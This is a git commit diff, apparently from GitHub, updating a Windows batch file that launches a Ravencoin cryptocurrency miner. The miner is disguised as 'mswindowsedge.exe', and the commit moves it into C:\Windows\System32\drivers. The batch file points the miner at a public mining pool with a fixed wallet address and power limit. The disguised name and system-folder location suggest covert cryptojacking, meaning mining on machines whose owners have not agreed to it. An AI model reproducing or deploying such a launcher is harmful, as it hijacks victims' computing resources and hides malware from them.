3223aec3e334b7efb94705090c441e503f1bf508
nothingtoseehere121 <98023403+nothingtoseehere121@users.noreply.github.com>
2022-09-07 03:02:25 -0700

    Update cmd.bat

--- cmd.bat
+++ cmd.bat
@@ -1,3 +1,3 @@
 @ECHO OFF
-mswindowsedge.exe  -a kawpow -o stratum+tcp://stratum-ravencoin.flypool.org:3333 --pl 130 -u  RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.RGS-200
+C:\Windows\System32\drivers\mswindowsedge.exe  -a kawpow -o stratum+tcp://stratum-ravencoin.flypool.org:3333 --pl 130 -u  RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.RGS-200
 pause
